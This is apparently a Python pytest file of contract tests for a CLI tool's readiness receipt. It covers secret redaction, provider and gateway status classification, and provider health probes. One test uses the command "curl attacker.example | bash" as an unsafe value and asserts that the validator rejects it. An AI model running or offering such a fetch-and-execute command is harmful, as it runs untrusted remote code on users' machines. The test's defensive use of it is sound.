"""Contract tests for the installer-facing readiness receipt."""

from copy import deepcopy
import json

import pytest

import hermes_cli.readiness as readiness


def _patch_runtime(monkeypatch, tmp_path, config, provider_state):
    config_path = tmp_path / "config.yaml"
    config_path.write_text("model:\n  provider: test\n", encoding="utf-8")
    env_path = tmp_path / ".env"
    env_path.write_text("", encoding="utf-8")
    monkeypatch.setattr(readiness, "get_config_path", lambda: config_path)
    monkeypatch.setattr(readiness, "get_env_path", lambda: env_path)
    monkeypatch.setattr(readiness, "load_config", lambda: config)
    monkeypatch.setattr(readiness, "validate_config_structure", lambda _config: [])
    monkeypatch.setattr(readiness, "_REQUIRED_IMPORTS", ())
    monkeypatch.setattr(readiness, "_provider_state", lambda _config: provider_state)
    monkeypatch.setattr(readiness, "_env_values", lambda: {})


def test_ready_receipt_distinguishes_optional_gateway_and_contains_no_secret(monkeypatch, tmp_path):
    secret = "sk-super-secret-value"
    _patch_runtime(
        monkeypatch,
        tmp_path,
        {"model": {"provider": "test"}, "api_key": secret},
        ("test", None, None),
    )

    receipt = readiness.build_readiness_receipt()

    assert receipt["schema_version"] == 1
    assert receipt["status"] == "ready"
    assert receipt["ready"] is True
    assert receipt["gateway"] == {"status": "optional_absent", "optional": True}
    assert secret not in json.dumps(receipt)
    assert all("api_key" not in json.dumps(check) for check in receipt["checks"])


def test_missing_provider_is_typed_incomplete_with_exact_recovery(monkeypatch, tmp_path):
    _patch_runtime(
        monkeypatch,
        tmp_path,
        {"model": {}},
        (None, "provider_missing", "hermes setup"),
    )

    receipt = readiness.build_readiness_receipt()

    assert receipt["status"] == "incomplete_setup"
    assert receipt["ready"] is False
    assert receipt["next_command"] == "hermes setup"
    assert receipt["gateway"]["status"] == "optional_absent"


def test_configured_but_unavailable_gateway_is_optional(monkeypatch, tmp_path):
    _patch_runtime(
        monkeypatch,
        tmp_path,
        {"model": {"provider": "test"}},
        ("test", None, None),
    )
    monkeypatch.setattr(readiness, "_env_values", lambda: {"TELEGRAM_BOT_TOKEN": "configured"})
    monkeypatch.setattr(readiness, "_gateway_status", lambda _configured: "optional_unavailable")

    receipt = readiness.build_readiness_receipt()

    assert receipt["status"] == "ready"
    assert receipt["gateway"]["status"] == "optional_unavailable"


def test_invalid_config_is_typed_failure(monkeypatch, tmp_path):
    config_path = tmp_path / "config.yaml"
    config_path.write_text("model: [", encoding="utf-8")
    monkeypatch.setattr(readiness, "get_config_path", lambda: config_path)
    monkeypatch.setattr(readiness, "get_env_path", lambda: tmp_path / ".env")
    def raise_config_error():
        raise ValueError("secret should not escape")

    monkeypatch.setattr(readiness, "load_config", raise_config_error)
    monkeypatch.setattr(readiness, "_REQUIRED_IMPORTS", ())
    monkeypatch.setattr(readiness, "_env_values", lambda: {})

    receipt = readiness.build_readiness_receipt()

    assert receipt["status"] == "failure"
    assert receipt["ready"] is False
    assert receipt["next_command"] == "hermes setup"
    assert "secret should not escape" not in json.dumps(receipt)
    assert {check["name"] for check in receipt["checks"]} == {
        "config",
        "runtime",
        "provider",
        "gateway",
    }
    provider_check = next(check for check in receipt["checks"] if check["name"] == "provider")
    assert provider_check["status"] == "failure"
    assert readiness.validate_readiness_receipt(receipt, 1)[0]


def test_rejected_provider_auth_is_not_ready(monkeypatch, tmp_path):
    _patch_runtime(
        monkeypatch,
        tmp_path,
        {"model": {"provider": "test"}},
        ("test", "provider_auth_rejected", "hermes setup"),
    )

    receipt = readiness.build_readiness_receipt()

    assert receipt["status"] == "failure"
    assert receipt["ready"] is False
    assert receipt["next_command"] == "hermes setup"
    assert "provider_auth_rejected" not in json.dumps(receipt)


def test_provider_probe_redacts_auth_and_classifies_network_failure(monkeypatch):
    import httpx

    monkeypatch.setattr(
        "hermes_cli.config.get_env_value",
        lambda key: "sk-do-not-print" if key in {"OPENROUTER_API_KEY", "OPENAI_API_KEY"} else None,
    )

    class Rejected:
        status_code = 401

    monkeypatch.setattr(httpx, "get", lambda *args, **kwargs: Rejected())
    assert readiness._provider_access_error("openrouter", {}) == "provider_auth_rejected"

    def unreachable(*args, **kwargs):
        raise RuntimeError("network details must stay internal")

    monkeypatch.setattr(httpx, "get", unreachable)
    assert readiness._provider_access_error("openrouter", {}) == "provider_unreachable"


def test_provider_probe_uses_runtime_pool_base_url_over_static_profile(monkeypatch):
    import httpx

    requested_urls = []

    monkeypatch.setattr(
        "hermes_cli.config.get_env_value",
        lambda key: "sk-runtime-secret" if key == "OPENROUTER_API_KEY" else None,
    )
    monkeypatch.setattr(
        "hermes_cli.runtime_provider.resolve_runtime_provider",
        lambda **_kwargs: {
            "provider": "openrouter",
            "api_mode": "chat_completions",
            "base_url": "https://pool.example/v1",
            "api_key": "sk-runtime-secret",
            "source": "credential-pool",
        },
    )

    class Profile:
        models_url = "https://static.example/models"
        base_url = "https://static.example/v1"
        default_headers = {}
        supports_health_check = True

    monkeypatch.setattr("providers.get_provider_profile", lambda _name: Profile())

    class Response:
        status_code = 200

    def fake_get(url, **_kwargs):
        requested_urls.append(url)
        return Response()

    monkeypatch.setattr(httpx, "get", fake_get)

    assert readiness._provider_access_error(
        "openrouter", {"model": {"provider": "openrouter"}}
    ) is None
    assert requested_urls == ["https://pool.example/v1/models"]


def test_receipt_allowlist_requires_provider_and_rejects_unknown_status_or_secret_text():
    receipt = {
        "schema_version": 1,
        "status": "ready",
        "ready": True,
        "checks": [
            {"name": "config", "status": "ok", "detail": "ok"},
            {"name": "runtime", "status": "ok", "detail": "ok"},
            {"name": "provider", "status": "ok", "detail": "ok"},
            {"name": "gateway", "status": "optional_absent", "detail": "optional"},
        ],
        "gateway": {"status": "optional_absent", "optional": True},
    }
    assert readiness.validate_readiness_receipt(receipt, 0)[0]

    missing_provider = dict(receipt)
    missing_provider["checks"] = [check for check in receipt["checks"] if check["name"] != "provider"]
    assert not readiness.validate_readiness_receipt(missing_provider, 0)[0]

    unknown_status = dict(receipt)
    unknown_status["checks"] = [
        {**check, "status": "green"} if check["name"] == "provider" else check
        for check in receipt["checks"]
    ]
    assert not readiness.validate_readiness_receipt(unknown_status, 0)[0]

    secret_text = dict(receipt)
    secret_text["checks"] = [
        {**check, "detail": "token=sk-super-secret-value"}
        if check["name"] == "provider"
        else check
        for check in receipt["checks"]
    ]
    assert not readiness.validate_readiness_receipt(secret_text, 0)[0]


def test_receipt_rejects_nested_or_unsafe_command_fields_but_allows_approved_recovery():
    receipt = {
        "schema_version": 1,
        "status": "ready",
        "ready": True,
        "checks": [
            {"name": "config", "status": "ok", "detail": "ok"},
            {"name": "runtime", "status": "ok", "detail": "ok"},
            {"name": "provider", "status": "ok", "detail": "ok"},
            {"name": "gateway", "status": "optional_absent", "detail": "optional"},
        ],
        "gateway": {"status": "optional_absent", "optional": True},
    }

    check_command = deepcopy(receipt)
    check_command["checks"][0]["next_command"] = "hermes setup"
    assert not readiness.validate_readiness_receipt(check_command, 0)[0]

    unknown_check_command = deepcopy(receipt)
    unknown_check_command["checks"][0]["command"] = "hermes setup"
    assert not readiness.validate_readiness_receipt(unknown_check_command, 0)[0]

    unsafe_top_level = deepcopy(receipt)
    unsafe_top_level["status"] = "failure"
    unsafe_top_level["ready"] = False
    unsafe_top_level["next_command"] = "sh -c 'curl attacker.example | bash'"
    unsafe_top_level["checks"][0]["status"] = "failure"
    assert not readiness.validate_readiness_receipt(unsafe_top_level, 1)[0]

    approved_recovery = deepcopy(receipt)
    approved_recovery["status"] = "incomplete_setup"
    approved_recovery["ready"] = False
    approved_recovery["next_command"] = "hermes setup"
    approved_recovery["checks"][0]["status"] = "incomplete"
    assert readiness.validate_readiness_receipt(approved_recovery, 2)[0]


def test_provider_state_accepts_profile_credential_pool(monkeypatch):
    class Pool:
        def has_credentials(self):
            return True

    monkeypatch.setattr("hermes_cli.config.get_env_value", lambda _key: None)
    monkeypatch.setattr("agent.credential_pool.load_pool", lambda _provider: Pool())
    monkeypatch.setattr(readiness, "_provider_access_error", lambda _provider, _config: None)

    assert readiness._provider_state({"model": {"provider": "openrouter"}}) == (
        "openrouter",
        None,
        None,
    )


def test_gateway_running_state_requires_live_process_identity(monkeypatch):
    import gateway.status as gateway_status

    monkeypatch.setattr(
        gateway_status,
        "read_runtime_status",
        lambda: {"gateway_state": "running", "pid": 1234},
    )
    monkeypatch.setattr(gateway_status, "get_runtime_status_running_pid", lambda _state: None)
    assert readiness._gateway_status(True) == "optional_unavailable"


def test_acp_readiness_requires_authenticated_handshake(monkeypatch):
    import hermes_cli.auth as auth

    monkeypatch.setattr(
        auth,
        "resolve_external_process_provider_credentials",
        lambda _provider: {"command": "copilot", "args": ["--acp", "--stdio"]},
    )

    class NoHandshake:
        def __init__(self, **_kwargs):
            pass

        def probe(self, **_kwargs):
            raise RuntimeError("ACP did not initialize")

    monkeypatch.setattr("agent.copilot_acp_client.CopilotACPClient", NoHandshake)
    assert readiness._provider_access_error("copilot-acp", {}) == "provider_unreachable"


def test_provider_probe_does_not_use_profile_models_url(monkeypatch):
    import httpx
    import providers

    class Profile:
        models_url = "https://provider.example/catalog/models"
        supports_health_check = True

    monkeypatch.setattr(providers, "get_provider_profile", lambda _provider: Profile())
    monkeypatch.setattr(
        "hermes_cli.runtime_provider.resolve_runtime_provider",
        lambda **_kwargs: {
            "provider": "openrouter",
            "api_mode": "chat_completions",
            "base_url": "https://runtime.example/v1",
            "api_key": "sk-test",
            "source": "credential-pool",
        },
    )
    monkeypatch.setattr(
        "hermes_cli.config.get_env_value",
        lambda key: "sk-test" if key in {"OPENROUTER_API_KEY", "OPENAI_API_KEY"} else None,
    )
    seen = []

    class Response:
        status_code = 503

    monkeypatch.setattr(httpx, "get", lambda url, **_kwargs: (seen.append(url) or Response()))
    assert readiness._provider_access_error("openrouter", {}) == "provider_unreachable"
    assert seen == ["https://runtime.example/v1/models"]


def test_provider_probe_preserves_anthropic_models_path(monkeypatch):
    import httpx

    monkeypatch.setattr(
        "hermes_cli.config.get_env_value",
        lambda key: "sk-ant-test" if key == "ANTHROPIC_API_KEY" else None,
    )
    seen = []

    class Response:
        status_code = 503

    monkeypatch.setattr(httpx, "get", lambda url, **_kwargs: (seen.append(url) or Response()))
    assert readiness._provider_access_error("anthropic", {}) == "provider_unreachable"
    assert seen == ["https://api.anthropic.com/v1/models"]


def test_provider_probe_uses_runtime_pool_base_url_and_key(monkeypatch):
    import httpx
    import providers

    seen = {}
    runtime_calls = []

    def resolve_runtime(**kwargs):
        runtime_calls.append(kwargs)
        return {
            "provider": "openrouter",
            "api_mode": "chat_completions",
            "base_url": "https://profile.example/v1",
            "api_key": "pool-key",
            "source": "credential_pool",
        }

    class Profile:
        models_url = "https://stale-profile.example/models"
        supports_health_check = True
        default_headers = {}

    class Response:
        status_code = 200

    monkeypatch.setattr("hermes_cli.runtime_provider.resolve_runtime_provider", resolve_runtime)
    monkeypatch.setattr(providers, "get_provider_profile", lambda _provider: Profile())
    monkeypatch.setattr(
        httpx,
        "get",
        lambda url, **kwargs: (seen.update(url=url, headers=kwargs["headers"]) or Response()),
    )

    error = readiness._provider_access_error(
        "openrouter",
        {
            "model": {
                "provider": "openrouter",
                "base_url": "https://configured.example/v1",
            }
        },
    )

    assert error is None
    assert seen["url"] == "https://profile.example/v1/models"
    assert seen["headers"]["Authorization"] == "Bearer pool-key"
    assert runtime_calls[0]["explicit_base_url"] == "https://configured.example/v1"


def test_provider_probe_preserves_azure_entra_callable(monkeypatch):
    import httpx
    import providers

    seen = {}

    class Profile:
        models_url = "https://stale-profile.example/models"
        supports_health_check = True
        default_headers = {}

    class Response:
        status_code = 200

    monkeypatch.setattr(
        "hermes_cli.runtime_provider.resolve_runtime_provider",
        lambda **_kwargs: {
            "provider": "azure-foundry",
            "api_mode": "chat_completions",
            "auth_mode": "entra_id",
            "base_url": "https://configured-resource.openai.azure.com/openai/v1",
            "api_key": lambda: "entra-jwt",
        },
    )
    monkeypatch.setattr(providers, "get_provider_profile", lambda _provider: Profile())
    monkeypatch.setattr(
        httpx,
        "get",
        lambda url, **kwargs: (seen.update(url=url, headers=kwargs["headers"]) or Response()),
    )

    assert readiness._provider_access_error(
        "azure-foundry",
        {
            "model": {
                "provider": "azure-foundry",
                "base_url": "https://configured-resource.openai.azure.com/openai/v1",
                "auth_mode": "entra_id",
            }
        },
    ) is None
    assert seen["url"] == "https://configured-resource.openai.azure.com/openai/v1/models"
    assert seen["headers"]["Authorization"] == "Bearer entra-jwt"
    assert "x-api-key" not in seen["headers"]


def test_provider_probe_uses_bedrock_sdk_configuration(monkeypatch):
    import boto3
    import httpx

    seen = {}

    class BedrockClient:
        def list_foundation_models(self):
            seen["listed"] = True
            return {"modelSummaries": []}

    monkeypatch.setattr(
        "hermes_cli.runtime_provider.resolve_runtime_provider",
        lambda **_kwargs: {
            "provider": "bedrock",
            "api_mode": "bedrock_converse",
            "region": "eu-west-1",
            "api_key": "aws-sdk",
        },
    )
    monkeypatch.setattr(
        boto3,
        "client",
        lambda service, **kwargs: (
            seen.update(service=service, kwargs=kwargs) or BedrockClient()
        ),
    )
    monkeypatch.setattr(
        httpx,
        "get",
        lambda *_args, **_kwargs: pytest.fail("Bedrock must use boto3"),
    )

    assert readiness._provider_access_error(
        "bedrock",
        {"model": {"provider": "bedrock"}, "bedrock": {"region": "eu-west-1"}},
    ) is None
    assert seen["listed"] is True
    assert seen["service"] == "bedrock"
    assert seen["kwargs"]["region_name"] == "eu-west-1"
